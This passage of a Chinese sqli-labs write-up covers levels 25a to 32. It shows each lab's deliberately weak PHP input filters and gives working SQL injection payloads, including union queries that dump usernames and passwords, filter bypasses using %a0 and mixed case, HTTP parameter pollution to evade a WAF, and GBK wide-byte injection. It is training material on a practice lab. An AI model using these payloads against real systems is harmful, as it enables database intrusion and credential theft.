<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			//strip out OR (non <span class="keyword">case</span> sensitive)</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="variable">$id</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>通过关键代码发现，该关卡主要没有包含对于id的单引号，同事没有输出错误项，报错注入不可使用，但是可以采用延时注入和联合注入的方式</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/172.18.9.91/sqli</span>-labs-master/Less-<span class="number">25</span>a/?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,@@<span class="title">version</span>,3<span class="comment">#</span></span></span><br></pre></td></tr></table></figure>

<p>同样需要使用||   &amp;&amp; 代替or  and</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-master/Less<span class="number">-25</span><span class="keyword">a</span>/?id=<span class="number">20</span> || <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>其余联合查询的的playload与less25时一样的，只要将-1’的单引号去除就行</p>
<h4 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h4><p>tips:本关卡需要通过liunx环境进行测试，windows部分字符编码无法解析</p>
<p>关键代码</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//strip</span> out OR (non <span class="keyword">case</span> sensitive)</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out AND (non <span class="keyword">case</span> sensitive)</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//strip</span> out /*</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out --</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//</span>Strip out <span class="comment">#</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out spaces</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out slashes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>本关卡将空格，or，and，<code>/*</code>,#,–,/等各种符号进行了过滤，and和or仍旧使用&amp;&amp; 和 || 进行处理，对于注释和结尾字符此处只能利用构造一个 <code>‘</code>来闭合后面的<code>&#39;</code>，对于空格，有较多的方法：</p>
<table>
<thead>
<tr>
<th>%09</th>
<th>TAB键（水平）</th>
</tr>
</thead>
<tbody><tr>
<td>%0a</td>
<td>新建一行</td>
</tr>
<tr>
<td>%0c</td>
<td>新的一页</td>
</tr>
<tr>
<td>%0d</td>
<td>return 功能</td>
</tr>
<tr>
<td>%0b</td>
<td>TAB键（垂直）</td>
</tr>
<tr>
<td>%a0</td>
<td>空格</td>
</tr>
</tbody></table>
<p>尝试playload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">26</span><span class="regexp">/?id=1'%a0||'1</span></span><br></pre></td></tr></table></figure>

<p>explain：’%a0||’1</p>
<p>此处的 sql 语句为 SELECT * FROM users WHERE id=’1’ || ‘1’ LIMIT 0,1<br>第一个 ‘ 首先闭合 id=’$id’ 中的’ ， %a0 是空格的意思， （ps： 此处我的环境是 ubun<br>tu14.04+apache+mysql+php， 可以解析%a0， 此前在 windows+wamp 测试， 不能解析%a0） 同时%0b 也是可以通过测试的， 其他的经测试是不行的。 ||是或者的意思，‘1 则是为了闭合后面的 ’ 。因此可以构造类似的语句</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli-labs-master/Less-<span class="number">26</span>/<span class="built_in">?id</span>=<span class="number">100</span><span class="meta">%27union</span><span class="meta">%0bselect</span><span class="meta">%a01</span>,<span class="number">2</span>,<span class="number">3</span>||<span class="meta">%271</span></span><br></pre></td></tr></table></figure>

<p>接下来就只需要更改sql语句即可</p>
<h4 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h4><p>该关卡依旧要在liunx环境下进行测试。</p>
<p>关键代码：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//strip</span> out OR (non <span class="keyword">case</span> sensitive)</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out AND (non <span class="keyword">case</span> sensitive)</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//strip</span> out /*</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out --</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//</span>Strip out <span class="comment">#</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out spaces</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out spaces</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out slashes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>这关与 26 的区别在于， sql 语句添加了一个括号， 同时在 sql 语句执行抛出错误后并<br>不在前台页面输出。 所有我们排除报错注入， 这里依旧是利用 union 注入。  </p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-master/Less<span class="number">-26</span><span class="keyword">a</span>/?id=<span class="number">1</span><span class="string">')union%a0select%a01,2,3||('</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>explain： 基础与 26 一致， 我们直接用 ‘) 闭合前面的， 然后跟上自己构造的注入语句即<br>可。 最后利用（’1 进行闭合即可。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-master/Less<span class="number">-26</span><span class="keyword">a</span>/?id=<span class="number">1</span><span class="string">')union%a0select%a01,user(),('</span><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>可将 user()更换为你想要的 sql 语句。 同时该例可以利用延时注入。 </p>
<h4 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h4><p>关键代码：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//strip</span> out /*</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out --.</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//</span>Strip out <span class="comment">#.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out spaces.</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out spaces.</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out spaces.</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out union</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out select</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out UNION</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out SELECT</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out Union</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out select</span><br></pre></td></tr></table></figure>

<p>本关卡主要考察union，select和上个关卡过滤掉的字符。上个关卡过滤字符参照上个关卡的处理方式，union，select使用大小写混合的方式进行绕过。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">27</span><span class="regexp">/?id=100'unIon%a0SelEcT%a01,database(),3||'1</span></span><br></pre></td></tr></table></figure>

<p>tips:uniunionon 也是可以突破限制的。 亦可以利用报错注入和延时注入的语法进行注入  </p>
<h4 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h4><p>通过源码发现该关卡与less27的主要区别在与id的处理，此处使用的是<code>&quot;</code>进行处理，同时mysql错误不会回显。根据less27playload</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-master/Less<span class="number">-27</span><span class="keyword">a</span>/?id=<span class="number">100</span><span class="string">"unIon%a0SelEcT%a01,database(),"</span><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>TIPs:这里说下以上 payload 我们利用最后的 3 前面的 “ 将后面的 “ 给闭合掉。 或者亦可以利用以前的方法 1,user(),3 || “1， 同时本关可以用延时注入的方法进行注入。  </p>
<h4 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h4><p>关键代码：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$s</span>ql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="symbol">$id</span>= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="symbol">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="symbol">$id</span>= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="symbol">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="symbol">$id</span>= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="symbol">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="symbol">$id</span>= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="symbol">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   //Strip out spaces.</span></span><br><span class="line"><span class="symbol">$id</span>= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="symbol">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="symbol">$id</span>= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, <span class="symbol">$id</span>);	<span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure>

<p>该关卡与less27差不多的处理，只是将id加了括号的处理，需要进行括号闭合</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">27</span><span class="regexp">/?id=1')union%a0select(1),(user()),(3)||'(1</span></span><br></pre></td></tr></table></figure>

<h4 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id= preg<span class="constructor">_replace('<span class="operator">/</span><span class="params">union</span>\<span class="params">s</span>+<span class="params">select</span><span class="operator">/</span><span class="params">i</span>',<span class="string">""</span>, $<span class="params">id</span>)</span>;	    <span class="comment">//Strip out spaces.</span></span><br></pre></td></tr></table></figure>

<p>本关卡与less28一致，只是少点半部分的过滤条件</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less<span class="number">-28</span>a/?id=<span class="number">100</span><span class="symbol">%27</span>)unIon<span class="symbol">%0</span>bsElect<span class="symbol">%0</span>b<span class="number">1</span>,@<span class="title">@basedir</span>,<span class="number">3</span>||(<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<h3 id="Background-6-服务器（两层）架构"><a href="#Background-6-服务器（两层）架构" class="headerlink" title="Background-6 服务器（两层）架构"></a>Background-6 服务器（两层）架构</h3><p><img src="/2019/12/27/sqli-labs-writeup/50.png" alt></p>
<p>服务器端有两个部分，第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。主要的工作流程为：客户端访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。</p>
<p>环境安装参考：<a href="https://blog.csdn.net/qq_43579362/article/details/104298144" target="_blank" rel="noopener">https://blog.csdn.net/qq_43579362/article/details/104298144</a></p>
<p>中间y有一步是进行sqli-labs进行数据安装步骤，发现无法连接本地数据库，参考博客：<a href="https://www.cnblogs.com/NexTen/p/7671280.html" target="_blank" rel="noopener">https://www.cnblogs.com/NexTen/p/7671280.html</a></p>
<p>安装完成且在虚拟机可正常访问后，查看kali虚拟机ip，并在物理机浏览器上可直接访问。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/51.png" alt></p>
<p>这边设计一个知识点，HPP漏洞，即http参数污染，是web容器处理http参数时的问题，比如说：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">比如访问<span class="symbol">URL:</span><span class="symbol">http:</span>/<span class="regexp">/www.xxx.com/index</span>.php?str=hello此时，页面显示hello。但如果访问<span class="symbol">:http</span><span class="symbol">://www</span>.xxx.com/index.php?str=hello&amp;str=world&amp;str=nmask此时，页面显示nmask，把前面参数的值给覆盖了，这就是http参数污染。</span><br><span class="line"></span><br><span class="line">参考<span class="symbol">https:</span>/<span class="regexp">/nmask.gitbooks.io/vulnerability</span>-box/webying-yong-lou-dong/urlpath-pollution.html</span><br></pre></td></tr></table></figure>

<p>也就是说当访问页面index.php?id=1&amp;id=2，浏览器所解析显示的是哪个id参数，这要看是什么中间件，若是apache（php）解析的是最后一个参数，即id=2，若为Tomcat（jsp）解析的是第一个参数，即id=1</p>
<table>
<thead>
<tr>
<th align="center">web服务器</th>
<th align="center">参数获取函数</th>
<th align="center">获取到的参数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">PHP/Apache</td>
<td align="center">$_GET(“par”)</td>
<td align="center">Last</td>
</tr>
<tr>
<td align="center">JSP/Tomcat</td>
<td align="center">Request.getParameter(“par”)</td>
<td align="center">First</td>
</tr>
<tr>
<td align="center">Perl(CGI)/Apache</td>
<td align="center">Param(“par”)</td>
<td align="center">First</td>
</tr>
<tr>
<td align="center">Python/Apache</td>
<td align="center">getvalue(“par”)</td>
<td align="center">All(List)</td>
</tr>
<tr>
<td align="center">ASP/IIS</td>
<td align="center">Request.QueryString(“par”)</td>
<td align="center">All(comma-delimitedstring)</td>
</tr>
</tbody></table>
<p>以上为大多数服务器对于参数解析的介绍</p>
<p>这边要注意一个问题，index.jsp?id=1&amp;id=2请求，针对表格中的服务器配置情况，客户端请求首先过tomcat，tomcat解析第一个参数，然后tomcat去请求apache（php）服务器，apache解析最后一个参数，那最终返回客户端的会是哪个参数？实际上应为id=2的内容，应为时间上提供服务的是apapche（php）服务器，返回的数据也应该是apache处理数据，而在实际应用中，也是有两层服务器的情况。往往在tomcat服务器做数据过滤和处理，功能类似为一个WAF，而正因为解析参数的不同，此处可以利用该原理绕过WAF的检测。该用法就是HPP，http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁。</p>
<h4 id="less29"><a href="#less29" class="headerlink" title="less29"></a>less29</h4><p>查看tomcat中的index.jsp文件</p>
<p><img src="/2019/12/27/sqli-labs-writeup/52.png" alt></p>
<p>在apache的index.php中，sql语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>因此根据HPP原理，直接上playload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.128:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=-2' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/53.png" alt></p>
<p>其余的playload就像less-1一样</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.159</span><span class="number">.128</span>:<span class="number">8080</span>/sqli-labs/Less<span class="number">-29</span>/<span class="keyword">index</span>.jsp?id=<span class="number">1</span>&amp;id=<span class="number">-2</span><span class="string">' union select 1,database(),3 -- +</span></span><br><span class="line"><span class="string">//查询数据库名</span></span><br><span class="line"><span class="string">http://192.168.159.128:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=-2'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="comment">-- +</span></span><br><span class="line">//查询数据库<span class="keyword">security</span>下的表名</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.159</span><span class="number">.128</span>:<span class="number">8080</span>/sqli-labs/Less<span class="number">-29</span>/<span class="keyword">index</span>.jsp?id=<span class="number">1</span>&amp;id=<span class="number">-2</span><span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="string">'</span></span><br><span class="line"><span class="string">//查询users表中列名</span></span><br><span class="line"><span class="string">http://192.168.159.128:8080/sqli-labs/Less-29/index.jsp?ia=1&amp;id=-2'</span> <span class="keyword">union</span> <span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="number">3</span> <span class="comment">-- +</span></span><br><span class="line">//查询users表中id=<span class="number">3</span>的用户名和密码</span><br></pre></td></tr></table></figure>

<h4 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h4><p>less30的原理和less29原理是一致的，区别在与less30中的sql查询语句对id进行了处理</p>
<p><img src="/2019/12/27/sqli-labs-writeup/54.png" alt></p>
<p>所以我们的playload没有太大的变化</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.128:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=-2" union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>() <span class="comment">-- +</span></span><br><span class="line">//查询数据库名   <span class="keyword">security</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.159</span><span class="number">.128</span>:<span class="number">8080</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-30</span>/index.jsp?<span class="keyword">id</span>=<span class="number">1</span>&amp;<span class="keyword">id</span>=<span class="number">-2</span><span class="string">" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- +</span></span><br><span class="line"><span class="string">//查询数据库security下表名</span></span><br><span class="line"><span class="string">http://192.168.159.128:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=-2"</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">-- +</span></span><br><span class="line">//查询<span class="keyword">users</span>表中的列名</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.159</span><span class="number">.128</span>:<span class="number">8080</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-30</span>/index.jsp?<span class="keyword">id</span>=<span class="number">1</span>&amp;<span class="keyword">id</span>=<span class="number">-2</span><span class="string">" union selecr 1,username,password from users where id=3</span></span><br><span class="line"><span class="string">//查询users表中id=3的用户名和密码</span></span><br></pre></td></tr></table></figure>

<h4 id="less31"><a href="#less31" class="headerlink" title="less31"></a>less31</h4><p>less31与前面两个关卡注入方式是一样的，区别在于id的处理上</p>
<p><img src="/2019/12/27/sqli-labs-writeup/55.png" alt></p>
<p>所以playload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.159.128:8080&#x2F;sqli-labs&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,database() -- +</span><br><span class="line">&#x2F;&#x2F;查询数据库名称</span><br><span class="line">http:&#x2F;&#x2F;192.168.159.128:8080&#x2F;sqli-labs&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;-- +</span><br><span class="line">&#x2F;&#x2F;查询数据库security中表名</span><br><span class="line">http:&#x2F;&#x2F;192.168.159.128:8080&#x2F;sqli-labs&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br><span class="line">&#x2F;&#x2F;查询users表中列名</span><br><span class="line">http:&#x2F;&#x2F;192.168.159.128:8080&#x2F;sqli-labs&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,username,password from users where id&#x3D;3 -- +</span><br><span class="line">&#x2F;&#x2F;查询users表中id&#x3D;3的用户名和密码</span><br></pre></td></tr></table></figure>

<p>总结：从上面的三个关卡，我们获知在不同的服务器总对于参数的处理时不同的，HPP的应用有很多，不仅仅上上述的WAF一个方面，还可执行重复操作，可以执行非法操作等。同事针对WAF的绕过，这边只是一小部分，还有许多方面可以进行研究。</p>
<h3 id="Background-7-宽字节注入"><a href="#Background-7-宽字节注入" class="headerlink" title="Background-7 宽字节注入"></a>Background-7 宽字节注入</h3><p>less-32,33,34,35,36,37六个关卡是针对<code>&#39;</code>和<code>\</code>的过滤。宽字节注入的原理和方法：</p>
<p>原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如：%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。在过滤 <code>&#39;</code>的时候往往利用的思路就是将 <code>&#39;</code>转换为<code>\&#39;</code>（通过转换函数进行）</p>
<p>因此在此想办法将<code>&#39;</code>前面添加的<code>\</code>除掉，一般是通过以下两种思路：</p>
<ul>
<li>%df除掉<code>\</code>，具体原因是<code>urlencode(&#39;\) =%5c%27</code>,在%5c%27前面添加%df，形成%df%5c%27,而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此时%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到目的</li>
<li>将<code>\&#39;</code>中的<code>\</code>过滤掉，例如可以构造%**%5c%5c%27的情况，后面的%5会被前面的%5c给注释掉，这也是一种bypass的一种方法</li>
</ul>
<h4 id="less32"><a href="#less32" class="headerlink" title="less32"></a>less32</h4><p>利用上述的原理，尝试一下playload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs/Less-32/?id=-1%df' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>有个奇怪的地方，使用kali2020中（即上一个背景环境）进行测试发现是没有返回数据，通过原先（即前面二十几个关卡的环境）是可以返回原先的值，原因不知道是什么，是因为kali2020自带的mysql数据库是MariaDB的原因吗？</p>
<p><img src="/2019/12/27/sqli-labs-writeup/56.png" alt></p>
<p>可以看到，已经绕过了对于<code>&#39;</code>的过滤，从源代码进行考虑：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/57.png" alt></p>
<p>上述函数为过滤<code>&#39; \</code>的函数，将<code>&#39;</code>转为<code>\&#39;</code>,将<code>\</code>转为<code>\\</code>，将<code>&quot;</code>转为<code>\&quot;</code>。因此此处只能考虑background中的第一个思路，添加%df后将%5c吃掉即可。从上图的input HEX中可以看到df5c27，此处已经将df5c看成是一个字符。</p>
